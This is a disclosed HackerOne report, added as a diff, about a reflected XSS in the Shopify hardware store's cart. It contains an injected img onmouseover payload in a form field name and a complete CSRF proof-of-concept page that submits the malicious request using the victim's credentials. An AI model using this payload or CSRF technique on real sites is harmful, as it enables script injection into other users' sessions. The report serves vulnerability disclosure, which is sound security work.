@@ -1,0 +1,72 @@
+ReportLink:https://hackerone.com/reports/95089
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/juhhga
+ReportedTo:Shopify(shopify)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:22.12.2015 19:57:07
+
+Summary:
+
+There is a reflected XSS at hardware.shopify.com in cart section. As there is no CSRF protetion for adding products to a cart, this one is a legitimate cross-user reflected XSS/HTML injection
+
+Reproduction:
+1. Got to http://hardware.shopify.com/collections/gift-cards/products/custom-gift-card
+2. Select an image, click "add to Cart"
+3. Intercept the request and change the 'artwork file' parameter as follows:
+before: Content-Disposition: form-data; name="properties[Artwork file]"
+after: Content-Disposition: form-data; name="properties[Artwork file<img src='test' onmouseover='alert(2)'>]";
+4. Forward the request, return to the cart, mouseover the image and see a popup.
+
+Altyernatively, use the following CSRF PoC:
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://hardware.shopify.com/cart/add", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------13411895127118");
+        xhr.withCredentials = true;
+        var body = "-----------------------------13411895127118\r\n" + 
+          "Content-Disposition: form-data; name=\"properties[Artwork file\x3cimg src=\'test\' onmouseover=\'alert(2)\'\x3e]\"; filename=\"test.png\"\r\n" + 
+          "Content-Type: image/png\r\n" + 
+          "\r\n" + 
+          "\x89PNG\r\n" + 
+          "\x1a\n" + 
+          "\x00\x00\x00\rIHDR\x00\x00\x00\xc7\x00\x00\x00\xcc\x08\x02\x00\x00\x00H\xa0 R\x00\x00\x00\x01sRGB\x00\xae\xce\x1c\xe9\x00\x00\x00\x04gAMA\x00\x00\xb1\x8f\x0b\xfca\x05\x00\x00\x00\tpHYs\x00\x00\x12t\x00\x00\x12t\x01\xdef\x1fx\x00\x00\x01\xfcIDATx^\xed\xd21\x01\x00\x00\x0c\xc3\xa0\xf97\xdd\x99\xc8\t\x1a\xb8A\xcd*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\x9eU\xf4\xac\xa2g\x15=\xab\xe8YE\xcf*zV\xd1\xb3\x8a\xda\xf6\xe3\xef\xfb\xfc\x89u\x11o\x00\x00\x00\x00IEND\xaeB`\x82\r\n" + 
+          "-----------------------------13411895127118\r\n" + 
+          "Content-Disposition: form-data; name=\"properties[Custom text line 1]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------13411895127118\r\n" + 
+          "Content-Disposition: form-data; name=\"properties[Custom text line 2]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------13411895127118\r\n" + 
+          "Content-Disposition: form-data; name=\"properties[Custom text line 3]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------13411895127118\r\n" + 
+          "Content-Disposition: form-data; name=\"production-time\"\r\n" + 
+          "\r\n" + 
+          "standard\r\n" + 
+          "-----------------------------13411895127118\r\n" + 
+          "Content-Disposition: form-data; name=\"id\"\r\n" + 
+          "\r\n" + 
+          "976094353\r\n" + 
+          "-----------------------------13411895127118--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
